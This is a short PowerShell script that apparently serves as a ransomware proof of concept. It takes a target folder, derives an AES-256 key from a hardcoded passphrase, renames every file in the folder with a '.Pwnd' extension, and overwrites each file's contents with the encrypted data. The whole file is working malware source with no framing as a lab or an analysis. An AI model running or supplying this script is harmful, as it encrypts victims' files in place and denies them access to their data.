Param (
    [string]$TargetFolder
)
# $TargetFolder="/Documents"
$Shared_Key ="Encrypt!on-K3y"

$sha256 = [System.Security.Cryptography.SHA256]::create()
$key = $sha256.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Shared_key));

#Creation Objet AES
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.KeySize = 256
$aes.Key = $key
$aes.GenerateIV()
$iv = $aes.IV

foreach ($file in Get-ChildItem $TargetFolder)
{
    $FileName=$file.FullName;
    Get-Content -Path $file.FullName -TotalCount 1;
    Write-host "Filename : " $FileName
    $NewFileName=$FileName+".Pwnd"
    Rename-Item -Path $file.FullName -NewName $NewFileName;
    # Read File content
    $PlainBytes = [System.IO.file]::ReadAllBytes($NewFileName);
    # Create Encryptor
    $Encryptor = $aes.CreateEncryptor()
    # Encrypt Data
    $EncryptedBytes = $Encryptor.TransformFinalBlock($PlainBytes, 0, $PlainBytes.Length)
    # Merge IV + Encrypted Data
    $FinalBytes = $iv + $EncryptedBytes
    # Write Encrypted File
    [System.IO.File]::WriteAllBytes($NewFileName,$FinalBytes)
    Write-host "File " $NewFileName " has been encrypted."
}